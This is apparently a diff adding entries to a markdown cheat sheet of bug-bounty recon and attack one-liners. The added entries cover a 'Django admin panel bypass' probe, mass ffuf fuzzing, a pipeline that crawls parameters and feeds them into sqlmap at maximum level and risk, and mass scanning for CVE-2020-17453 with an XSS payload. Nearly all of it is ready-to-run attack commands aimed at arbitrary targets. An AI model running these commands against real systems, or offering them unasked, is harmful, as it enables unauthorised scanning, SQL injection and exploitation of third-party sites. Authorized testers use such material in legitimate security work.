@@ -76,6 +76,35 @@ cat ~/domain.txt | httprobe | while read url;do ww=$(for i in "X-Oversized-Heade
 httpx -l hosts.txt -threads 100 -paths /wp-admin/setup-config.php?step=1 -title -tech-detect -status-code
 ```
 
+### Django admin panel bypass
+
+```bash
+httpx -l hosts.txt -threads 100 -x POST -paths /admin/login/?next=/admin/ -title -tech-detect -status-code -title -follow-redirects
+```
+
+### ffuf combination with rush for faster threading
+
+```bash
+rush -i /opt/recon/xxx/hostsAlive -j 10 'ffuf -o $(echo {} | unfurl domains) -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -u "{}/FUZZ" -sf -ignore-body -mc 200 -t 300'
+```
+
+### SQLMAP with paramspider 
+
+```bash
+python3 paramspider.py -d target.com -s TRUE -e woff,ttf,svg,eot | deduplicate --sort | sed '1,4d' | httpx -silent | sqlmap --level=5 --risk=3 
+```
+
+### Mass CVE-2020-17453 scanning 
+
+```bash
+subfinder -d target.com -all | httpx -paths /carbon/admin/login.jsp?msgId=%27;alert(1)// -status-code -location -content-length 
+```
+
+
+
+
+
+
 
 
 
